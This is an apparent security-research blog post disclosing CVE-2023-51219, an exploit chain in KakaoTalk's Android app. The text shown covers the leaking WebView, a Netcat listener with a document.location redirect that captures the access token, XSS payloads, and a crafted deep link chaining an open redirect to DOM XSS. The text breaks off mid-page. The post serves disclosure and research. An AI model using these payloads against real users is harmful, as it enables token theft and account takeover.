<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>1-click Exploit in South Korea's biggest mobile chat app | stulle123's Blog</title>
<meta name=keywords content="Android,XSS"><meta name=description content="Stealing another KakaoTalk user&rsquo;s chat messages with a simple 1-click exploit."><meta name=author content="stulle123"><link rel=canonical href=https://stulle123.github.io/posts/kakaotalk-account-takeover/><link crossorigin=anonymous href=/assets/css/stylesheet.5da5e1262c1716087f1e99439de067938b7af148b767eb4632ee530fedc432da.css integrity="sha256-XaXhJiwXFgh/HplDneBnk4t68Ui3Z+tGMu5TD+3EMto=" rel="preload stylesheet" as=style><link rel=icon href=https://stulle123.github.io/img/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://stulle123.github.io/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://stulle123.github.io/img/favicon-32x32.png%20><link rel=apple-touch-icon href=https://stulle123.github.io/img/apple-touch-icon.png><link rel=mask-icon href=https://stulle123.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://stulle123.github.io/posts/kakaotalk-account-takeover/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="1-click Exploit in South Korea's biggest mobile chat app"><meta property="og:description" content="Stealing another KakaoTalk user&rsquo;s chat messages with a simple 1-click exploit."><meta property="og:type" content="article"><meta property="og:url" content="https://stulle123.github.io/posts/kakaotalk-account-takeover/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-05-31T14:04:20+02:00"><meta property="article:modified_time" content="2024-06-23T14:04:20+02:00"><meta property="og:site_name" content="stulle123"><meta name=twitter:card content="summary"><meta name=twitter:title content="1-click Exploit in South Korea's biggest mobile chat app"><meta name=twitter:description content="Stealing another KakaoTalk user&rsquo;s chat messages with a simple 1-click exploit."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://stulle123.github.io/posts/"},{"@type":"ListItem","position":2,"name":"1-click Exploit in South Korea's biggest mobile chat app","item":"https://stulle123.github.io/posts/kakaotalk-account-takeover/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"1-click Exploit in South Korea's biggest mobile chat app","name":"1-click Exploit in South Korea\u0027s biggest mobile chat app","description":"Stealing another KakaoTalk user\u0026rsquo;s chat messages with a simple 1-click exploit.","keywords":["Android","XSS"],"articleBody":"In this blog post we show how multiple low-hanging fruit vulnerabilities in KakaoTalk‚Äôs Android app can lead to the disclosure of users‚Äô messages. We will cover different topics ranging from Android AppSec to Web Security.\nTL;DR First things first: PoC||GTFO\nA deep link validation issue in KakaoTalk 10.4.3 allows a remote adversary to run arbitrary JavaScript in a WebView that leaks an access token in a HTTP request header. Ultimately, this token can be used to takeover another user‚Äôs account and read her/his chat messages by registering an attacker-controlled device. This bug got assigned with CVE-2023-51219. We also release our tooling so that fellow security researchers can dig into KakaoTalk‚Äôs broad attack surface to find more bugs.\nContext With more than 100 million downloads from the Google Playstore, KakaoTalk is South Korea‚Äôs most popular chat app. Similar to apps such as WeChat, KakaoTalk is an ‚Äúall-in‚Äù app including everything into one app (payment, ride-hailing services, shopping, e-mail, etc.). End-to-end encrypted (E2EE) messaging is not enabled per default in KakaoTalk. Regular chatrooms, where Kakao Corp. can access messages in transit, is the preferred way for many users. KakaoTalk does have an opt-in E2EE feature called ‚ÄúSecure Chat‚Äù but it doesn‚Äôt support features such as group messaging or voice calling.\nEntry Point: CommerceBuyActivity The CommerceBuyActivity WebView is the main entry point and very interesting from an attacker‚Äôs point of view:\nIt‚Äôs exported and can be started with a deep link (e.g., adb shell am start kakaotalk://buy) It has JavaScript enabled (settings.setJavaScriptEnabled(true);) It supports the intent:// scheme to send data to other non-exported app components via JavaScript. For example, the URI \"intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=https://foo.bar;end\" loads the website https://foo.bar in the MyProfileSettingsActivity WebView. There‚Äôs no sanitization of intent:// URIs (e.g., the Component or Selector is not set to null). So, potentially any app component can be accessed. Additionally, it leaks an access token in the Authorization HTTP header. Here‚Äôs a simple way to reproduce this behavior:\nStart a Netcat listener in a terminal window: $ nc -l 5555 Run $ adb shell am start kakaotalk://buy to start the CommerceBuyActivity WebView Since WebView.setWebContentsDebuggingEnabled(true); you can use chrome://inspect in Chrome to debug it Go to the Console tab and enter document.location=\"http://:5555/\"; You should see a GET request and the Authorization header This means that if we find a way to run our own JavaScript inside the CommerceBuyActivity we would have the ability to steal the user‚Äôs access token and to start arbitrary app components when the user clicks on a malicious kakaotalk://buy deep link.\nUnfortunately, we can‚Äôt load arbitrary attacker-controlled URLs as there is some validation going on:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 public final String m17260P5(Uri uri) { // This string is \"https://buy.kakao.com\" String m36725d = C24983v.m36725d(); if (uri != null) { if (!C46907a.m54284B(uri.toString(), new ArrayList(Arrays.asList(C47684e.f174778c0, \"buy\")))) { return null; } if (C43097e.m51424i(uri.getQueryParameter(\"refresh\"), RTCStatsParser.Key.TRUE)) { this.f33349x = true; } if ((\"kakaotalk\".equals(uri.getScheme()) || \"alphatalk\".equals(uri.getScheme())) \u0026\u0026 \"buy\".equals(uri.getHost())) { // URL path can be controlled by an attacker if (!TextUtils.isEmpty(uri.getPath())) { m36725d = String.format(\"%s%s\", m36725d, uri.getPath()); } // URL query parameters can be controlled by an attacker if (!TextUtils.isEmpty(uri.getQuery())) { m36725d = String.format(\"%s?%s\", m36725d, uri.getQuery()); } // URL fragment can be controlled by an attacker if (!TextUtils.isEmpty(uri.getFragment())) { return String.format(\"%s#%s\", m36725d, uri.getFragment()); } return m36725d; } else if (C14325o2.f55096k.matcher(uri.toString()).matches()) { String uri2 = uri.toString(); if (uri2.startsWith(\"http://\")) { return uri2.replace(\"http://\", \"https://\"); } return uri2; } } return m36725d; } If you take a look at the code you‚Äôll recognize that we control the path, query parameters and fragment of the URL. However, everything is prefixed with the String m36725d which is https://buy.kakao.com in our case. That means if a user clicks on the deep link kakaotalk://buy/foo the URL https://buy.kakao.com/foo gets loaded in the CommerceBuyActivity WebView.\nMaybe there‚Äôs an Open Redirect or XSS issue on https://buy.kakao.com so that we can run JavaScript? ü§î\nURL Redirect to DOM XSS While digging into https://buy.kakao.com we identified the endpoint https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl= which allowed to redirect to any kakao.com domain. This vastly increased our chances to find a XSS flaw as there are many many subdomains under kakao.com.\nTo find a vulnerable website we just googled for site:*.kakao.com inurl:search -site:developers.kakao.com -site:devtalk.kakao.com and found https://m.shoppinghow.kakao.com/m/search/q/yyqw6t29. The string yyqw6t29 looked like a DOM Invader canary to us, so we investigated further.\nFunnily enough, there was already a Stored XSS as https://m.shoppinghow.kakao.com/m/search/q/alert(1) popped up an alert box. Searching the DOM brought up the responsible Stored XSS payload [Ìï¥Ïô∏]test \"\u003e","wordCount":"2392","inLanguage":"en","datePublished":"2024-05-31T14:04:20+02:00","dateModified":"2024-06-23T14:04:20+02:00","author":{"@type":"Person","name":"stulle123"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://stulle123.github.io/posts/kakaotalk-account-takeover/"},"publisher":{"@type":"Organization","name":"stulle123's Blog","logo":{"@type":"ImageObject","url":"https://stulle123.github.io/img/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://stulle123.github.io/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://stulle123.github.io/about title=About><span>About</span></a></li><li><a href=https://stulle123.github.io/search title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://stulle123.github.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://stulle123.github.io/>Home</a>&nbsp;¬ª&nbsp;<a href=https://stulle123.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">1-click Exploit in South Korea's biggest mobile chat app</h1><div class=post-meta><span title='2024-05-31 14:04:20 +0200 +0200'>May 31, 2024</span>&nbsp;¬∑&nbsp;12 min&nbsp;¬∑&nbsp;2392 words&nbsp;¬∑&nbsp;stulle123</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#tldr>TL;DR</a></li><li><a href=#context>Context</a></li><li><a href=#entry-point-commercebuyactivity>Entry Point: CommerceBuyActivity</a></li><li><a href=#url-redirect-to-dom-xss>URL Redirect to DOM XSS</a></li><li><a href=#deep-link-to-kakao-mail-account-takeover>Deep Link to Kakao Mail Account Takeover</a></li><li><a href=#kakaotalk-password-reset-with-burp>KakaoTalk Password Reset with Burp</a></li><li><a href=#poc>PoC</a><ul><li><a href=#attacker-prepares-the-malicious-deep-link>Attacker prepares the malicious deep link</a></li><li><a href=#victim-clicks-the-link-and-leaks-an-access-token-to-the-attacker>Victim clicks the link and leaks an access token to the attacker</a></li><li><a href=#attacker-uses-the-access-token-to-reset-the-victims-password>Attacker uses the access token to reset the victim&rsquo;s password</a></li><li><a href=#attacker-registers-herhis-device-the-victims-kakaotalk-account>Attacker registers her/his device the victim&rsquo;s KakaoTalk account</a></li></ul></li><li><a href=#takeaways>Takeaways</a></li><li><a href=#responsible-disclosure>Responsible Disclosure</a></li></ul></nav></div></details></div><div class=post-content><p>In this blog post we show how multiple low-hanging fruit vulnerabilities in KakaoTalk&rsquo;s Android app can lead to the disclosure of users&rsquo; messages. We will cover different topics ranging from Android AppSec to Web Security.</p><h2 id=tldr>TL;DR<a hidden class=anchor aria-hidden=true href=#tldr>#</a></h2><p>First things first: <a href=#poc>PoC||GTFO</a></p><video width=100% controls>
<source src=https://github.com/stulle123/kakaotalk_analysis/assets/14765446/7fd439c5-b96b-49d9-b8b5-cd9be2a51fe9 type=video/mp4></video><p>A deep link validation issue in KakaoTalk <code>10.4.3</code> allows a remote adversary to run arbitrary JavaScript in a WebView that leaks an access token in a HTTP request header. Ultimately, this token can be used to takeover another user&rsquo;s account and read her/his chat messages by registering an attacker-controlled device. This bug got assigned with <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51219">CVE-2023-51219</a>. We also release our <a href=https://github.com/stulle123/kakaotalk_analysis>tooling</a> so that fellow security researchers can dig into KakaoTalk&rsquo;s broad attack surface to find more bugs.</p><h2 id=context>Context<a hidden class=anchor aria-hidden=true href=#context>#</a></h2><p>With more than 100 million downloads from the Google Playstore, KakaoTalk is South Korea&rsquo;s most popular chat app. Similar to apps such as WeChat, KakaoTalk is an &ldquo;all-in&rdquo; app including everything into one app (payment, ride-hailing services, shopping, e-mail, etc.). End-to-end encrypted (E2EE) messaging is not enabled per default in KakaoTalk. Regular chatrooms, where Kakao Corp. can access messages in transit, is the preferred way for many users. KakaoTalk does have an opt-in E2EE feature called &ldquo;Secure Chat&rdquo; but it doesn&rsquo;t support features such as group messaging or voice calling.</p><h2 id=entry-point-commercebuyactivity>Entry Point: CommerceBuyActivity<a hidden class=anchor aria-hidden=true href=#entry-point-commercebuyactivity>#</a></h2><p>The <code>CommerceBuyActivity</code> WebView is the main entry point and very interesting from an attacker&rsquo;s point of view:</p><ul><li>It&rsquo;s exported and can be started with a deep link (e.g., <code>adb shell am start kakaotalk://buy</code>)</li><li>It has JavaScript enabled (<code>settings.setJavaScriptEnabled(true);</code>)</li><li>It supports the <code>intent://</code> <a href=https://www.mbsd.jp/Whitepaper/IntentScheme.pdf>scheme</a> to send data to other <strong>non-exported</strong> app components via JavaScript. For example, the URI <code>"intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=https://foo.bar;end"</code> loads the website <code>https://foo.bar</code> in the <code>MyProfileSettingsActivity</code> WebView.</li><li>There&rsquo;s no sanitization of <code>intent://</code> URIs (e.g., the <code>Component</code> or <code>Selector</code> is <strong>not</strong> set to <code>null</code>). So, potentially any app component can be accessed.</li></ul><p>Additionally, it leaks an access token in the <code>Authorization</code> HTTP header. Here&rsquo;s a simple way to reproduce this behavior:</p><ul><li>Start a Netcat listener in a terminal window: <code>$ nc -l 5555</code></li><li>Run <code>$ adb shell am start kakaotalk://buy</code> to start the <code>CommerceBuyActivity</code> WebView</li><li>Since <code>WebView.setWebContentsDebuggingEnabled(true);</code> you can use <code>chrome://inspect</code> in Chrome to debug it</li><li>Go to the <code>Console</code> tab and enter <code>document.location="http://&lt;your-IP-address>:5555/";</code></li><li>You should see a GET request and the <code>Authorization</code> header</li></ul><p>This means that if we find a way to run our own JavaScript inside the <code>CommerceBuyActivity</code> we would have the ability to steal the user&rsquo;s access token and to start arbitrary app components when the user clicks on a malicious <code>kakaotalk://buy</code> deep link.</p><p>Unfortunately, we can&rsquo;t load arbitrary attacker-controlled URLs as there is some validation going on:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>m17260P5</span><span class=p>(</span><span class=n>Uri</span><span class=w> </span><span class=n>uri</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// This string is &#34;https://buy.kakao.com&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>m36725d</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>C24983v</span><span class=p>.</span><span class=na>m36725d</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>uri</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>C46907a</span><span class=p>.</span><span class=na>m54284B</span><span class=p>(</span><span class=n>uri</span><span class=p>.</span><span class=na>toString</span><span class=p>(),</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ArrayList</span><span class=p>(</span><span class=n>Arrays</span><span class=p>.</span><span class=na>asList</span><span class=p>(</span><span class=n>C47684e</span><span class=p>.</span><span class=na>f174778c0</span><span class=p>,</span><span class=w> </span><span class=s>&#34;buy&#34;</span><span class=p>))))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>C43097e</span><span class=p>.</span><span class=na>m51424i</span><span class=p>(</span><span class=n>uri</span><span class=p>.</span><span class=na>getQueryParameter</span><span class=p>(</span><span class=s>&#34;refresh&#34;</span><span class=p>),</span><span class=w> </span><span class=n>RTCStatsParser</span><span class=p>.</span><span class=na>Key</span><span class=p>.</span><span class=na>TRUE</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>f33349x</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=s>&#34;kakaotalk&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>uri</span><span class=p>.</span><span class=na>getScheme</span><span class=p>())</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=s>&#34;alphatalk&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>uri</span><span class=p>.</span><span class=na>getScheme</span><span class=p>()))</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=s>&#34;buy&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>uri</span><span class=p>.</span><span class=na>getHost</span><span class=p>()))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// URL path can be controlled by an attacker</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>TextUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>uri</span><span class=p>.</span><span class=na>getPath</span><span class=p>()))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>m36725d</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=s>&#34;%s%s&#34;</span><span class=p>,</span><span class=w> </span><span class=n>m36725d</span><span class=p>,</span><span class=w> </span><span class=n>uri</span><span class=p>.</span><span class=na>getPath</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// URL query parameters can be controlled by an attacker</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>TextUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>uri</span><span class=p>.</span><span class=na>getQuery</span><span class=p>()))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>m36725d</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=s>&#34;%s?%s&#34;</span><span class=p>,</span><span class=w> </span><span class=n>m36725d</span><span class=p>,</span><span class=w> </span><span class=n>uri</span><span class=p>.</span><span class=na>getQuery</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// URL fragment can be controlled by an attacker</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>TextUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>uri</span><span class=p>.</span><span class=na>getFragment</span><span class=p>()))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=s>&#34;%s#%s&#34;</span><span class=p>,</span><span class=w> </span><span class=n>m36725d</span><span class=p>,</span><span class=w> </span><span class=n>uri</span><span class=p>.</span><span class=na>getFragment</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>m36725d</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>C14325o2</span><span class=p>.</span><span class=na>f55096k</span><span class=p>.</span><span class=na>matcher</span><span class=p>(</span><span class=n>uri</span><span class=p>.</span><span class=na>toString</span><span class=p>()).</span><span class=na>matches</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>uri2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uri</span><span class=p>.</span><span class=na>toString</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>uri2</span><span class=p>.</span><span class=na>startsWith</span><span class=p>(</span><span class=s>&#34;http://&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=n>uri2</span><span class=p>.</span><span class=na>replace</span><span class=p>(</span><span class=s>&#34;http://&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;https://&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>uri2</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>m36725d</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>If you take a look at the code you&rsquo;ll recognize that we control the path, query parameters and fragment of the URL. However, everything is prefixed with the String <code>m36725d</code> which is <code>https://buy.kakao.com</code> in our case. That means if a user clicks on the deep link <code>kakaotalk://buy/foo</code> the URL <code>https://buy.kakao.com/foo</code> gets loaded in the <code>CommerceBuyActivity</code> WebView.</p><p>Maybe there&rsquo;s an Open Redirect or XSS issue on <code>https://buy.kakao.com</code> so that we can run JavaScript? &#x1f914;</p><h2 id=url-redirect-to-dom-xss>URL Redirect to DOM XSS<a hidden class=anchor aria-hidden=true href=#url-redirect-to-dom-xss>#</a></h2><p>While digging into <code>https://buy.kakao.com</code> we identified the endpoint <code>https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl=</code> which allowed to redirect to any <code>kakao.com</code> domain. This vastly increased our chances to find a XSS flaw as there are many many subdomains under <code>kakao.com</code>.</p><p>To find a vulnerable website we just googled for <code>site:*.kakao.com inurl:search -site:developers.kakao.com -site:devtalk.kakao.com</code> and found <code>https://m.shoppinghow.kakao.com/m/search/q/yyqw6t29</code>. The string <code>yyqw6t29</code> looked like a <a href=https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/canary>DOM Invader canary</a> to us, so we investigated further.</p><p>Funnily enough, there was already a Stored XSS as <code>https://m.shoppinghow.kakao.com/m/search/q/alert(1)</code> popped up an alert box. Searching the DOM brought up the responsible Stored XSS payload <code>[Ìï¥Ïô∏]test ">&lt;svg/onload=alert(1);// Pullover Hoodie</code>. <strong>Edit:</strong> As of May 2024 this seems to be fixed.</p><p>Continuing to browse the DOM we discovered another <a href=https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:foo>endpoint</a> where the search query was passed to a <code>innerHTML</code> sink (see <a href=https://github.com/stulle123/kakaotalk_analysis/blob/main/doc/ACCOUNT_TAKEOVER.md#dom-xss>DOM Invader notes</a>). Eventually, the PoC XSS payload turned out to be as simple as <code>">&lt;img src=x onerror=alert(1);></code>.</p><p>At this point we could run arbitrary JavaScript in the <code>CommerceBuyActivity</code> WebView when the user clicked on a deep link such as <code>kakaotalk://auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:">&lt;img src=x onerror=alert(1);></code>.</p><p>As explained <a href=#entry-point-commercebuyactivity>above</a>, <code>CommerceBuyActivity</code> leaks the user&rsquo;s access token in the <code>Authorization</code> header.</p><p>What could we do with this token? Maybe take over a victim‚Äôs KakaoTalk account? &#x1f60c;</p><style type=text/css>.box-shortcode{padding:1.6em;padding-top:1.4em;line-height:1.4em;margin-top:1em;margin-bottom:2em;border-radius:4px;color:#444;background:#f3ebe850}.box-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:#fff;background:#6ab0de}.box-shortcode.warning .box-title{background:#ff6b6b}.box-shortcode.warning{background:#ff6b6b4f}.box-shortcode.info .box-title{background:#0089e488}.box-shortcode.info{background:#0089e41c;box-shadow:3px 3px 5px #0089e410}.box-shortcode.important .box-title{background:#f7ec2c}.box-shortcode.important{background:#f7ec2c7d}.box-shortcode.tip .box-title{background:#a3ffa34d}.box-shortcode.tip{background:#a3ffa34d;box-shadow:3px 3px 5px #0089e410}.icon-box{display:inline-flex;align-self:center;margin-right:8px}.icon-box img,.icon-box svg{height:1em;width:1em;fill:currentColor}.icon-box img,.icon-box.baseline svg{top:.125em;position:relative}.box-shortcode p{margin-bottom:.6em}.box-shortcode p:first-of-type{display:inline}.box-shortcode p:nth-of-type(2){margin-top:.6em}.box-shortcode p:last-child{margin-bottom:0}</style><svg width="0" height="0" display="none" xmlns="http://www.w3.org/2000/svg"><symbol id="tip-box" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379.0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628.0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628.0l-22.627 22.627c-6.248 6.248-6.248 16.379.0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"/></symbol><symbol id="important-box" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405.0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346 7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373.0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884.0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="warning-box" viewBox="0 0 576 512" preserveAspectRatio="xMidYMid meet"><path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 